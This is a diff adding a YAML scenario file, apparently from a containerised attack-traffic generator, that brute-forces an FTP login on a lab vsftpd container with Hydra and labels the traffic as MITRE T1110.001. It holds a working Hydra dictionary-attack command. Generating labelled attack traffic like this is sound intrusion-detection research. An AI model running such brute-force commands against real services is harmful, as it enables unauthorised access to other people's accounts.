@@ -1,0 +1,33 @@
+type: single-target
+attacker:
+  name: hydra
+  image: ghcr.io/idlab-discover/concap/hydra:ubuntu24
+  atkCommand: |
+    cp /usr/share/wordlists/2023-200_most_used_passwords.txt /tmp/vsftp-passwords.txt
+    printf '%s\n' '1mp0ss1bl3P4ssw0rd!' >> /tmp/vsftp-passwords.txt
+    hydra -l ftpuser -P /tmp/vsftp-passwords.txt -t 4 -f -V ftp://$TARGET_IP
+  atkTime: 90s
+  cpuRequest: 250m
+  memRequest: 256Mi
+target:
+  name: vsftp
+  image: ghcr.io/idlab-discover/concap/vsftp:20.04b
+  cpuRequest: 200m
+  memRequest: 256Mi
+  startupProbe:
+    tcpSocket:
+      port: 21
+    periodSeconds: 1
+    failureThreshold: 30
+network:
+  bandwidth: 100Mbit
+  queueSize: 100ms
+  delay: 1ms
+  jitter: 0ms
+  loss: 0%
+labels:
+  label: "1"
+  category: credential-access
+  subcategory: ftp-dictionary-hydra
+  service: ftp
+  mitreTechnique: T1110.001
